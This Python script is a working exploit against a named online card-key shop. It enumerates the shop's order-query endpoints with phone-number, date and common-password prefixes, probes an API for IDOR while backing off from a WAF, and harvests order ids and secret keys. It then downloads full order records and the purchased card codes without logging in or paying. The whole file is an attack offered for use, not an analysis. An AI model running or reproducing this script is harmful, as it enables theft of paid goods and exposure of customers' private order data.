#!/usr/bin/env python3
"""xinhe001 historical order extraction — no login, no payment.

Vectors:
  1. mod=query&data=  (订单号 / 交易单号 / 手机号 子串或精确)
  2. mod=query pagination when hits
  3. ajax.php?act=query (types 0-5)
  4. api.php GET slow IDOR (act=search/order/query/kmmail)
  5. ajax.php?act=order when id+skey pairs found
  6. mod=faka card pull from pairs
"""
from __future__ import annotations

import json
import os
import re
import sys
import time
from datetime import datetime
from pathlib import Path

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = Path(
    sys.argv[1]
    if len(sys.argv) > 1
    else f"/workspace/results_xinhe001/history_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
)
DELAY = float(sys.argv[2]) if len(sys.argv) > 2 else 0.35
API_N = int(sys.argv[3]) if len(sys.argv) > 3 else 120
PWD_FILE = os.environ.get("PWD_FILE", "/workspace/query_pwd_list.txt")
PROXY = os.environ.get("PROXY_URL") or os.environ.get("QG_TUNNEL", "")

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)
ORDER_ROW = re.compile(
    r"<tr[^>]*>.*?showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\).*?</tr>",
    re.S | re.I,
)


def log(msg: str) -> None:
    print(msg, flush=True)
    OUT.mkdir(parents=True, exist_ok=True)
    with (OUT / "progress.log").open("a", encoding="utf-8") as f:
        f.write(msg + "\n")


def session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Referer": BASE,
            "Accept-Language": "zh-CN",
        }
    )
    return s


def warm(s: requests.Session) -> bool:
    for i in range(6):
        try:
            r = s.get(BASE, timeout=30)
            if len(r.text) > 5000:
                return True
        except Exception as e:
            log(f"warm {i}: {e}")
            time.sleep(2 + i)
    return False


def extract_pairs(html: str) -> dict[str, str]:
    pairs: dict[str, str] = {}
    for m in SHOW.finditer(html):
        pairs[m.group(1)] = m.group(2)
    for m in FAKA.finditer(html):
        pairs[m.group(1)] = m.group(2)
    return pairs


def query_get(s: requests.Session, data: str, page: int | None = None) -> tuple[dict[str, str], dict]:
    params: dict = {"mod": "query", "data": data}
    if page:
        params["page"] = str(page)
    try:
        r = s.get(BASE, params=params, timeout=22)
    except Exception as e:
        return {}, {"err": str(e)[:80]}
    pairs = extract_pairs(r.text)
    pages_m = re.search(r'rows">(\d+)\s*/\s*(\d+)', r.text)
    meta = {
        "len": len(r.text),
        "pairs": len(pairs),
        "page_cur": pages_m.group(1) if pages_m else None,
        "page_total": pages_m.group(2) if pages_m else None,
        "empty": "没有任何订单" in r.text or "没有查询到" in r.text,
    }
    return pairs, meta


def build_queries(orders: int) -> list[str]:
    qs: set[str] = set()
    # digits 0-9, 00-99, 000-999
    for i in range(10):
        qs.add(str(i))
    for i in range(100):
        qs.add(f"{i:02d}")
    for i in range(1000):
        qs.add(f"{i:03d}")
    # order id band
    for oid in range(max(1, orders - 200), orders + 1):
        qs.add(str(oid))
    # trade_no date prefixes (rainbow format)
    for day in ("20260802", "20260801", "20260731", "20260730", "202607"):
        qs.add(day)
    for prefix in ("202608", "202607", "202606", "2025", "2026"):
        qs.add(prefix)
    # phone / qq common
    for p in (
        "13", "14", "15", "16", "17", "18", "19",
        "130", "131", "132", "133", "134", "135", "136", "137", "138", "139",
        "150", "151", "152", "153", "155", "156", "157", "158", "159",
        "170", "176", "177", "178", "180", "181", "182", "183", "184", "185",
        "186", "187", "188", "189",
        "86", "qq", "com", "COM", "bot", "sms", "http", "飞机", "扫码",
        "123456", "1234567", "12345678", "123456789", "888888", "666666",
        "5201314", "000000", "111111",
    ):
        qs.add(p)
    if os.path.isfile(PWD_FILE):
        with open(PWD_FILE, encoding="utf-8") as f:
            for line in f:
                v = line.strip()
                if v:
                    qs.add(v)
    return sorted(qs, key=lambda x: (len(x), x))


def ajax_query_scan(s: requests.Session, samples: list[str]) -> list[dict]:
    hits = []
    for typ in range(6):
        for content in samples:
            try:
                r = s.post(
                    BASE + "ajax.php?act=query",
                    data={"type": str(typ), "content": content, "pwd": content},
                    timeout=16,
                )
                pairs = extract_pairs(r.text)
                if pairs or '"code":0' in r.text and "kminfo" in r.text:
                    hits.append(
                        {
                            "type": typ,
                            "content": content,
                            "pairs": pairs,
                            "body": r.text[:500],
                        }
                    )
                    log(f"AJAX QUERY HIT type={typ} data={content!r} pairs={len(pairs)}")
            except Exception:
                pass
            time.sleep(0.25)
    return hits


def api_slow_scan(s: requests.Session, orders: int, n: int) -> list[dict]:
    hits = []
    acts = ["search", "order", "query", "kmmail"]
    waf_streak = 0
    for i, oid in enumerate(range(orders, max(orders - n, 0), -1)):
        for act in acts:
            try:
                r = s.get(BASE + f"api.php?act={act}&id={oid}", timeout=25)
                waf_streak = 0
                t = r.text.strip()
                if not t or len(t) < 15:
                    continue
                if "No Act" in t or '"code":-5' in t:
                    continue
                if extract_pairs(t) or '"code":0' in t or "kminfo" in t:
                    hits.append({"act": act, "id": oid, "body": t[:800]})
                    log(f"API HIT {act} id={oid} {t[:100]}")
            except Exception as e:
                err = str(e).lower()
                if "reset" in err or "disconnect" in err or "proxy" in err:
                    waf_streak += 1
                    if waf_streak >= 3:
                        log("API WAF block — stopping api scan")
                        return hits
                    time.sleep(15)
                    warm(s)
            time.sleep(3.5)
        if i % 10 == 0:
            log(f"api progress id={oid} hits={len(hits)}")
            save_state({"api_hits": hits})
    return hits


def fetch_order_json(s: requests.Session, oid: str, skey: str) -> dict | None:
    try:
        r = s.post(
            BASE + "ajax.php?act=order",
            data={"id": oid, "skey": skey},
            timeout=18,
        )
        if '"code":0' in r.text:
            return json.loads(r.text)
    except Exception:
        pass
    return None


def fetch_card(s: requests.Session, oid: str, skey: str) -> str | None:
    try:
        r = s.get(
            BASE,
            params={"mod": "faka", "id": oid, "skey": skey},
            timeout=20,
        )
        if "非发卡" in r.text:
            return None
        m = CARD.search(r.text)
        return m.group(1).strip() if m else None
    except Exception:
        return None


def save_state(extra: dict) -> None:
    path = OUT / "state.json"
    state = {}
    if path.exists():
        state = json.loads(path.read_text(encoding="utf-8"))
    state.update(extra)
    state["updated"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    path.write_text(json.dumps(state, ensure_ascii=False, indent=2), encoding="utf-8")


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    s = session()
    if not warm(s):
        log("FAIL: cannot reach homepage")
        return

    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20).json()
    orders = int(gc.get("orders", 5727))
    log(f"getcount orders={orders} site={gc.get('site')}")

    pairs: dict[str, str] = {}
    query_log: list[dict] = []
    done_q: set[str] = set()

    if (OUT / "pairs.json").exists():
        pairs = json.loads((OUT / "pairs.json").read_text(encoding="utf-8"))
    if (OUT / "done_queries.txt").exists():
        done_q = set((OUT / "done_queries.txt").read_text().splitlines())

    queries = build_queries(orders)
    log(f"queries={len(queries)} existing_pairs={len(pairs)}")

    for idx, q in enumerate(queries):
        if q in done_q:
            continue
        new, meta = query_get(s, q)
        if new:
            pairs.update(new)
            query_log.append({"data": q, "new": len(new), "meta": meta})
            log(f"[{idx+1}/{len(queries)}] QUERY HIT data={q!r} +{len(new)} total={len(pairs)}")
            # paginate
            total_pages = int(meta.get("page_total") or 1)
            for page in range(2, min(total_pages + 1, 20)):
                more, m2 = query_get(s, q, page=page)
                if more:
                    pairs.update(more)
                    log(f"  page {page} +{len(more)}")
                time.sleep(DELAY)
        done_q.add(q)
        if len(done_q) % 50 == 0:
            save_state({"pairs": pairs, "query_log": query_log, "done": len(done_q)})
            (OUT / "pairs.json").write_text(
                json.dumps(pairs, ensure_ascii=False, indent=2), encoding="utf-8"
            )
        time.sleep(DELAY)

    (OUT / "pairs.json").write_text(
        json.dumps(pairs, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (OUT / "done_queries.txt").write_text("\n".join(sorted(done_q)), encoding="utf-8")
    log(f"query scan done pairs={len(pairs)}")

    # ajax query on hot samples + order ids
    samples = list({str(orders), str(orders - 1), "20260802", "138", "123456789"}) + list(
        pairs.keys()
    )[:10]
    ajax_hits = ajax_query_scan(s, samples)

    # api slow (optional, WAF sensitive)
    api_hits: list[dict] = []
    if os.environ.get("XINHE_API_SCAN") == "1":
        api_hits = api_slow_scan(s, orders, API_N)

    orders_data: dict[str, dict] = {}
    cards: dict[str, str] = {}

    for oid, skey in sorted(pairs.items(), key=lambda x: int(x[0])):
        od = fetch_order_json(s, oid, skey)
        if od:
            orders_data[oid] = od
            log(f"ORDER {oid} money={od.get('money')} status={od.get('status')} kminfo={bool(od.get('kminfo'))}")
        card = fetch_card(s, oid, skey)
        if card:
            cards[oid] = card
            log(f"CARD {oid} {card[:80]}")
        time.sleep(DELAY)

    report = {
        "target": "xinhe001.lol",
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "getcount": gc,
        "pairs_count": len(pairs),
        "orders_exported": len(orders_data),
        "cards_count": len(cards),
        "query_hits": len(query_log),
        "ajax_hits": len(ajax_hits),
        "api_hits": len(api_hits),
        "CARD_LEAK": bool(pairs or orders_data or cards),
    }

    (OUT / "orders.json").write_text(
        json.dumps(orders_data, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    if cards:
        (OUT / "cards.txt").write_text(
            "\n".join(f"{oid}\t{cards[oid]}" for oid in sorted(cards, key=int)),
            encoding="utf-8",
        )
    (OUT / "report.json").write_text(
        json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    save_state(report)
    log(f"DONE pairs={len(pairs)} orders={len(orders_data)} cards={len(cards)}")


if __name__ == "__main__":
    main()
